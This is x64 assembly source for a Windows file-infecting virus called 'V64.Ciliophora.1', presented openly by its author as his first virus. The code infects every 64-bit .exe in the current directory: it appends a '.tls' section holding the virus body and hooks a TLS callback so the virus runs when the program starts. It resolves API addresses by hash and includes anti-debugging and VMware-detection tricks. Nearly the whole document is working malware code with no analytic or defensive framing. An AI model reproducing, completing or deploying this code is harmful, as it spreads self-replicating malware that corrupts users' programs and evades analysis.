; V64.Ciliophora.1 by sep.7
; This is my first virus. It infect only PE32+ files 

; Uses Tls directory 
; Not infect files with tls directory
; Add new section, named ".tls"
; Infect *.exe files in current directory
; ASLR support 
; Uses fibers
; Small anti-debug (by checking EFLAGS.TF)
; Vmware detect by str 
; Compiler -> ml64

include macros.inc
include consts.inc
.data
Cilio db "Ciliophora.1 -> Win64 Infection",0
.code

VirusStart:
call VirusEnd
db 68h

toproc_:
 pop r13 ; ->virus_start
 pop r12 ; ->virus_end
 pop r11 
 sub r11,5 ; ->vir_start
ret

adler64csumm proc
; rcx = offset str4hash
 PUSHREGS
 mov rdi,rcx
 push rdi
 pop rsi
 xor rax,rax
 xor rcx,rcx
 dec rcx 
 cld
 next_symb:
  inc rcx
  scasb
 jnz next_symb
 
 mov rdi,rsi

 cmp rcx,0 
 je ret_
 
  mov r12,1
  mov r13,0
  sub r14,r14
  push 0
  pop rbx
  mov ebx,ADLER64_CONST
  
 adler64:
   mov r14b,byte ptr [rdi]
   add r12,r14
   scasb
   sub rdx,rdx
   mov rax,r12
   div ebx
   
   mov r12,rdx
   sub rdx,rdx
   
   add r13,r12
   mov rax,r13
   div ebx
   
   mov r13,rdx
   
 loop adler64 
 
 shl r13,32
 add r13,r12
 push r13
 pop rax
 
 ret_:
 POPREGS
 
 ret
adler64csumm endp

GetApiAddressByHash proc
PUSHREGS
     mov r11d,dword ptr [rcx+3Ch]
     ; export directory
     lea r11,[rcx+r11+88h]
     sub r12,r12
     ; export directory rva
     mov r12d,dword ptr [r11]
     ; IMAGE_EXPORT_DIRECTORY
     add r12,rcx
     xor r8,r8
     ;number of functions
     mov r8d,dword ptr [r12+18h]
     sub r9,r9
     ; AddressOfNames
     mov r9d,dword ptr [r12+20h]
     ; function names virtual address
     add r9,rcx    
     dec r8
contin_next:
     sub rsi,rsi
     mov esi,dword ptr [r9+r8*4]
     add rsi,rcx
     push rcx
     ; rcx => current function name
     mov rcx, rsi
     call adler64csumm
     pop rcx
     ; rax=> current function hash
     ; rdx=> needed function hash
     cmp rax,rdx
     jz finish_found
     dec r8
     jnz contin_next
     jmp no_more_functions
 finish_found:
     sub rbx,rbx
     ; AddressOfNameOrdinals RVA
     mov ebx,dword ptr [r12+24h] 
     ;NameOrdinals virtual address
     add rbx,rcx
     ; index in address table into r8
     mov r8w, word ptr [rbx+r8*2]
     and r8d,0FFFFh
     imul rbx,0
     mov ebx,dword ptr [r12+1Ch] 
     add rbx,rcx
     ; RVA 
     mov eax, [rbx+r8*4]
     add rax,rcx
     jmp ret_
     
 no_more_functions:
     sub rax,rax
 ret_:
POPREGS
ret
GetApiAddressByHash endp

IsValid64Exe proc
    push r10
    cmp rcx,0
    je fail_
    mov r10w,'ZM'
    cmp word ptr [rcx],r10w
    jnz fail_
    ; eax => PE offset
    mov eax,dword ptr [rcx+3Ch]
    ; pe signature check 
    mov r10w, 'E'
    shl r10w,8
    or r10w,'P'
    cmp word ptr [rcx+rax],r10w ; PE
    jnz fail_
    ; machine
    cmp word ptr [rcx+rax+4],08664h ; IMAGE_FILE_MACHINE_AMD64
    jnz fail_
    sub rax,rax
    inc rax
    jmp ret_
 fail_:
    xor rax,rax
 ret_:   
    pop r10
 ret
IsValid64Exe endp


IsTls proc
 GETTLSDIRECTORY
 imul rax,0
 cmp qword ptr [rcx],0
 jnz found_
 jmp ret_
 found_:
  inc rax
 ret_:
 ret
IsTls endp

SetVirusInfo proc
 ; rcx-> ponter to mapped  victim
 ; rdx-> EntryOffset - offset MAIN - virus entry point
 ; r8 -> Virus start address
 ; r9 -> size of virus
 ; r10 -> aligned raw size of virus
 local SectionAlignment:dword
 local AlignedVirusSize:dword
 local pFileHeader:qword
 local pOptionalHeader:qword
 local pImageBase:qword
 local pTls:qword
 local Tls[7]:qword
 local pPointer:qword
 PUSHREGS
 
 mov r15,rcx ; save pointer to mapped image
 mov AlignedVirusSize,r10d
 
 mov r10d,dword ptr [rcx+3Ch]
 add r10,rcx
 inc r10
 inc r10
 inc r10
 inc r10 ; r10->FileHeader
 push r10
 pop pFileHeader
 mov r10w,word ptr [r10+2] ; FileHeader.NumberOfSections
 and r10,0FFFFh
 mov r14w,r10w ; r14w -> NumberOfSections
 
 push rcx
 GETTLSDIRECTORY
 mov pTls,rcx
 pop rcx
 
 GETOPTIONALHEADER
 push rcx ; rcx -> pOptionalHeader
 
 ; aslr support ;)
 
 mov r10w,IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
 not r10w
 and word ptr [rcx+46h],r10w ;DllCharacteristics
 
 ;kill bound import
 
 mov qword ptr [rcx+200],0 ; Bound import offset
 
 mov r10,qword ptr [rcx+18h] ; OptionalHeader.ImageBase
 mov pImageBase,r10
 
 pop pOptionalHeader ; save pointer to OptionalHeader
 mov r10d,dword ptr [rcx+20h] ; get section alignment
 mov SectionAlignment,r10d
 
 push pFileHeader
 pop r10
 mov r10w,word ptr [r10+10h] ;  FileHeader.SizeOfOptionalHeader 
 and r10,0FFFFh
 
 add r10,pOptionalHeader ; first section header
 
 mov r11w,r14w 
 and r11,0FFFFh
 imul r11,IMAGE_SECTION_HEADER_SIZE
 
 add r10,r11 ; pointer to our image_section_header

 ; Get last section info
 ; VirtualAddress
 mov r13d,dword ptr [r10-IMAGE_SECTION_HEADER_SIZE+0ch]
 ; Virtual Size
 add r13d,dword ptr [r10-IMAGE_SECTION_HEADER_SIZE+08h]
 ; PointerToRawData
 mov r14d,dword ptr [r10-IMAGE_SECTION_HEADER_SIZE+14h]
 ; SizeOfRawData
 add r14d,dword ptr [r10-IMAGE_SECTION_HEADER_SIZE+10h]
 
 ;zero section header space
 mov ecx,IMAGE_SECTION_HEADER_SIZE
 sub rax,rax
 mov rdi,r10
 cld
 rep stosb
 
 ; Fill new section info
 mov dword ptr [r10],"slt." ; Section Name
 
 ; VirtualAddress
 
 mov r11d,r13d
 mov r13d,SectionAlignment
 ALIGNVALUE r11,r13  ; get aligned value
 
 mov dword ptr [r10+0Ch], r11d
 add rdx,r11
 
 mov pPointer,r11 ; virus section rva
 mov r12,r9
 add  pPointer,r12
 add  pPointer,48 ; save pointer to end of tls directory+8
 
 ; VirtualSize
 
 mov r11,r9
 mov r13d,SectionAlignment
 ALIGNVALUE r11,r13
 mov dword ptr [r10+8],r11d
 
 ; PointerToRawData 
 mov dword ptr [r10+14h],r14d
 
 ; raw size
 mov r12d,AlignedVirusSize
 mov dword ptr [r10+010h],r12d 
 
 ; characteristics
 mov dword ptr [r10+24h],IMAGE_ALL_ACCESS
 
 ; change SizeOfImage
 mov r12,pOptionalHeader
 add dword ptr [r12+38h],r11d
 
 ; inc NumberOfSections
 
 mov r12,pFileHeader
 inc word ptr [r12+2]
 
 mov r12,pOptionalHeader
 mov r12,pImageBase
 add pPointer,r12
 
 ; write virus body
 
 mov ecx,r9d
 mov rsi,r8 ; virus begin
 mov rdi,r14
 add rdi,r15 ; r15 = pointer to mapped image
 cld
 rep movsb
 
 ; Fill Tls directory
 mov r13,pPointer
 ;StartAddressOfRawData
 mov Tls[0],r13
 ;EndAddressOfRawData
 mov Tls[8],r13
 ;AddressOfIndex
 mov Tls[16],r13
 sub r13, 8
 mov Tls[24],r13
 mov r13,rdx
 add r13,pImageBase
 mov Tls[32],0
 mov Tls[40],r13
 mov Tls[48],0
 ; write tls directory

 mov rcx,56
 lea rsi,Tls
 cld
 rep movsb
 
 ; set tls directory info
 
 mov r10,pPointer
 sub r10,pImageBase ; r10-> tls directory rva
 sub r10,TLS_DIRECTORY_SIZE+8
 mov r11,pTls 
 mov dword ptr [r11],r10d
 mov dword ptr [r11+4],TLS_DIRECTORY_SIZE
  
 POPREGS
 ret
SetVirusInfo endp

Infection proc
  local hFind:qword
  local win32finddata[330]:byte
  local hFile:qword
  local pFileData:qword
  local uFileSize:qword
  local ReadedBytes:qword
  local hMapping:qword
  local hMem:qword
  local EntryOffset:dword
  local VirusBegin:qword
  local VirusSize:dword
  local FileAlignment:dword
  local AlignedVirSize:dword
  
  mov r12,rcx
  push r12
    jmp retaddr
    jump:
    jmp VirusStart ; get virus end, start and entry point
 
    retaddr:
    call jump
 
 ;return
 ; r11-> virus start
 ; r12-> virus end
 ; r13 -> main
    
    mov VirusBegin,r11
    sub r12,r11
    mov VirusSize,r12d
    sub r13,r11
    mov EntryOffset,r13d
  pop r12
  call _mask
  db "*.exe",0 ; search mask
  _mask:
  pop rcx
  lea rdx,win32finddata
  CALLEX [r12+FINDFIRSTFILEA*8]
  cmp rax,0
  jz ret_
  mov hFind,rax
   findloo:
    lea rax,win32finddata
    add rax,FINDFILENAMEOFFSET ;<- file name offset in win32finddata
    
    push 0
    push 0
    push 3
    mov r9,0
    mov r8,FILE_SHARE_READ
    mov rdx,GENERIC_ALL
    mov rcx,rax 
    CALLEX [r12+CREATEFILEA*8]
    add rsp,8*3
    cmp rax,-1
    jz loo
    mov hFile,rax
    mov rdx,0
    mov rcx,rax
    CALLEX [r12+GETFILESIZE*8]
    cmp rax,0
    jz close_handle
    mov uFileSize,rax
    
    mov r9,PAGE_READWRITE
    mov r8,MEM_COMMIT or MEM_RESERVE
    mov rdx,rax
    mov rcx,0
    CALLEX [r12+VIRTUALALLOC*8]
    cmp rax,0
    je close_handle
    mov pFileData,rax
    
    push 0
    lea r9,ReadedBytes
    mov r8,uFileSize
    mov rdx,pFileData
    mov rcx,hFile 
    CALLEX [r12+READFILE*8] ; read file data
    add rsp,8
    
    mov rcx, pFileData
    call IsValid64Exe
    cmp rax,0
    jz free_
    
    mov rcx,pFileData
    call IsTls 
    cmp rax,0
    jne free_ ; Do not infect files with Tls directory 
    
    mov rcx,pFileData
    GETOPTIONALHEADER
    mov r10d,dword ptr [rcx+24h]
    mov FileAlignment,r10d
    
    push r12
    mov r12d,VirusSize
    add r12,56
    mov r13d,FileAlignment
    ALIGNVALUE r12,r13
    mov AlignedVirSize,r12d
    
    add uFileSize,r12
    pop r12
    
    push 0
    push uFileSize
    mov r9,0
    mov r8,PAGE_READWRITE 
    mov rdx,0
    mov rcx,hFile
    CALLEX [r12+CREATEFILEMAPPING*8]
    add rsp,8*2
    cmp rax,0
    je free_
    mov hMapping,rax
    
    
    push uFileSize
    mov r9,0
    mov r8,0
    mov rdx,SECTION_ALL_ACCESS
    mov rcx,rax
    CALLEX [r12+MAPVIEWOFFILE*8]
    add rsp,8
    cmp rax,0
    je close_map
    mov hMem,rax
    
    mov r10d,AlignedVirSize
    mov r9d,VirusSize
    mov r8,VirusBegin
    mov edx,EntryOffset
    mov rcx,rax
    call SetVirusInfo
    
    mov rdx, FILE_ATTRIBUTE_SYSTEM
    lea rcx,win32finddata
    add rcx,FINDFILENAMEOFFSET
    CALLEX [r12+SETFILEATTRIBUTES*8]
    
    unmap_:
    mov rcx,hMem
    CALLEX [r12+UNMAPVIEWOFFILE*8]
    
    close_map:
    mov rcx,hMapping
    CALLEX [r12+CLOSEHANDLE*8]
   free_:
    
    mov r8,MEM_DECOMMIT
    mov rdx,uFileSize
    mov rcx,pFileData
    CALLEX [r12+VIRTUALFREE*8]
    
   close_handle: 
    
    mov rcx,hFile
    CALLEX [r12+CLOSEHANDLE*8]
    
   loo:
    
   lea rdx,win32finddata
   mov rcx,hFind
   CALLEX [r12+FINDNEXTFILEA*8]
   cmp rax,0
   jz endfind
   
   jmp findloo
   endfind:
   mov rcx,hFind
   CALLEX [r12+FINDCLOSE*8]
  ret_:
   ; return to main fiber
   mov rcx,qword ptr [r12+(NUMBER_OF_FUNCTIONS+1)*8]
   CALLEX [r12+SWITCHTOFIBER*8]
  ret
Infection endp

VirusEntry:
call toproc_

MAIN proc
    local kernel32base:qword
    local apiTable[NUMBER_OF_FUNCTIONS+1]:qword
    local free:qword
    
    call start
    ; infection procedure->fiber
    db 68h ; 4 debugger/disasm ;)
    jmp Infection
    
    start:
    
    pop r15 
    inc r15 ; save pointer to fiber proc
    
    call getkernel32base
    mov kernel32base,rax
    
    pushfq ; save RFLAGS into stack 
    pop r10
    shr r10,8
    ; check tf flag
    and r10,1
    sub r10,0
    jz no_debug
    
    ud2 ; the end
    
 no_debug:
    
    ; fill virus import
    PARAMETERSSET CREATEFILEAHASH,kernel32base ; see macros.inc
    call GetApiAddressByHash
    mov apiTable[CREATEFILEA*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET CREATEFILEMAPPINGHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[CREATEFILEMAPPING*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET MAPVIEWOFFILEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[MAPVIEWOFFILE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET GETFILESIZEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[GETFILESIZE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET UNMAPVIEWOFFILEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[UNMAPVIEWOFFILE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET CLOSEHANDLEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[CLOSEHANDLE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET FINDFIRSTFILEAHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[FINDFIRSTFILEA*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET FINDNEXTFILEAHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[FINDNEXTFILEA*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET FINDCLOSEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[FINDCLOSE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET READFILEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[READFILE*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET SETFILEATTRIBUTESHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[SETFILEATTRIBUTES*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET CREATEFIBERHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[CREATEFIBER*8],rax 
    cmp rax,0
    jz ret_
  
    PARAMETERSSET CONVERTTHREADTOFIBERHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[CONVERTTHREADTOFIBER*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET SWITCHTOFIBERHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[SWITCHTOFIBER*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET CONVERTFIBERTOTHREADHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[CONVERTFIBERTOTHREAD*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET DELETEFIBERHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[DELETEFIBER*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET VIRTUALALLOCHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[VIRTUALALLOC*8],rax 
    cmp rax,0
    jz ret_
    
    PARAMETERSSET VIRTUALFREEHASH,kernel32base
    call GetApiAddressByHash
    mov apiTable[VIRTUALFREE*8],rax 
    cmp rax,0
    jz ret_
    
    ; detect vmware
    str ax
    cmp ax,4000h 
    jnz no_vmware
    ud2
    no_vmware:
    
    lea r8,apiTable ; fiber parameter -> pointer to api table
    mov rdx,r15 ; fiber proc (jmp Infection)
    mov rcx, 0 ; Default stack size
    PUSHRETCALL apiTable[CREATEFIBER*8]
    cmp rax,0
    jz ret_
    mov r15,rax
    
    mov rcx,0
    PUSHRETCALL apiTable[CONVERTTHREADTOFIBER*8]
    ;save primary fiber pointer (4 return from child fiber)
    mov apiTable[(NUMBER_OF_FUNCTIONS+1)*8],rax
    
    mov rcx,r15
    PUSHRETCALL apiTable[SWITCHTOFIBER*8]
    
    mov rcx,r15
    PUSHRETCALL apiTable[DELETEFIBER*8]
    
    PUSHRETCALL apiTable[CONVERTFIBERTOTHREAD*8]
    
 ret_:  
    ret
    
MAIN endp

getkernel32base proc
 mov rax,gs:[30h]; _TEB
 mov rax,[rax+60h]; _PEB
 mov rax,[rax+18h] ; Ldr
 mov rax,[rax+10h] ; InLoadOrderMemoryList 
 mov rax,[rax] 
 mov rax,[rax]
 mov rax,[rax+30h]  ; kernel32.dll base
 
 ret
getkernel32base endp

db "V64.Ciliophora.1 by sep.7 , 2010",0

VirusEnd:
call VirusEntry

end 
